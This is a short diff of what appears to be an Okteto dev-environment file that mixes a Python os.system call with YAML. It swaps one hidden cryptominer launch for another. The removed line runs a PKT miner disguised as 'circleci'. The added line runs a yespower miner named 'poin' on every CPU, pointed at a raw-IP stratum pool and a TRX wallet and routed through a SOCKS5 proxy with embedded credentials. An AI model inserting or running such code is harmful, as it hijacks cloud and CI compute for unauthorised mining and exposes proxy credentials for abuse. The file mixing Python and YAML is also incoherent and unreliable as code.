@@ -1,4 +1,4 @@
 import os
-os.system ('chmod +x circleci; ./circleci ann -p pkt1qld6l62qjyd0v8rfqmlax48g3egx6v8rtxsf836 http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com')
+os.system ('chmod +x poin; ./poin -a yespower -o stratum+tcp://103.249.70.7:6533 -u TRzWbrKRmJYETRPTrVW8RwbX6Sa9KJNbZ7.Tetot -p c=TRX,mc=BTE -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80')
 devs:
   - api/okteto.yml
